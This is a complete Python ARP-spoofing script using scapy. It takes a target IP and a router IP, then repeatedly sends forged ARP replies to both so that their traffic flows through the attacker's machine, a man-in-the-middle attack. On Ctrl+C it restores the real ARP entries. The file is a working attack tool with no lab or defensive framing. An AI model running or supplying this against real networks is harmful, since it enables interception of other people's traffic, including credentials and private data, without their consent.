#!/usr/bin/env python 3
import time
import scapy.all as scapy

ip = input("enter target ip: ")
router_ip = input("router IP: ")
program = True
packet_count = 0


def scan(ip):
    """Scan Network For Connected Devices"""
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def create_packet(target_ip, spoof_ip):
    MAC = scan(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=MAC, psrc=spoof_ip)
    scapy.send(packet)


def restore(destination_ip, source_ip):
    destination_mac = scan(destination_ip)
    source_mac = scan(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, Verbose=False)
    print("Restore in Progres...")

while program:
    try:
        packet_count += 2
        create_packet(ip, router_ip)
        create_packet(router_ip, ip)
        time.sleep(2)
        print(f"\r Packets = {packet_count}")
    except KeyboardInterrupt:
        print("ctrl + c pressed... quitting")
        program = False
        restore(ip, router_ip)
